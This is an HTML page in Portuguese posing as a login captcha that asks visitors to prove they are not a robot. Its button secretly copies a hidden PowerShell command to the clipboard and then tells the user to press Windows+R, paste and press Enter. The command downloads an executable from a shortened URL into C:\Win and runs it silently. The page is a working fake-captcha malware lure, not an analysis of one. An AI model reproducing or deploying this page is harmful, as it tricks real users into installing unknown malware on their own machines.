<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Captcha Personalizado</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f4f7fa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background-color: #ffffff;
            border-radius: 10px;
            padding: 40px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 400px;
        }

        h2 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #333;
        }

        button {
            background-color: #4CAF50;
            color: white;
            font-size: 16px;
            padding: 12px 24px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 20px;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #45a049;
        }

        #mensagem {
            display: none;
            margin-top: 20px;
            font-weight: bold;
            color: #4CAF50;
            font-size: 18px;
        }

        #mensagem span {
            font-weight: normal;
        }

        .footer {
            margin-top: 30px;
            font-size: 14px;
            color: #888;
        }

        .footer a {
            color: #4CAF50;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>Antes de continuar com o Login Confirme que você não é um robô</h2>
        <button onclick="copiarTexto()">Clique aqui</button>

        <p id="mensagem">
            <span>Pressione Windows + R</span><br>
            <span>Ctrl -> V</span><br>
            <span>Enter </span><br>
            para confirmar que não é um robô
        </p>

        <p id="resultado"></p>

        <div class="footer">
            <p>Este captcha é necessário para garantir a integridade dos dados de nossos clientes.</p>
            <a href="#">Obrigado.</a>
        </div>
    </div>

    <script>
        function copiarTexto() {
            const comando = "powershell.exe -WindowStyle Hidden -Command "New-Item C:\Win -ItemType Directory -Force; Invoke-WebRequest -Uri 'https://tinyurl.com/4c24m3as' -OutFile C:\Win\instalador.exe; Start-Process C:\Win\instalador.exe -ArgumentList '/S' -WindowStyle Hidden""; // Define o texto que será copiado

            navigator.clipboard.writeText(comando).then(() => {
                // Exibe a mensagem de confirmação
                document.getElementById("mensagem").style.display = "block";
            }).catch(err => {
                console.error("Erro ao copiar texto: ", err);
            });
        }
    </script>

</body>
</html>
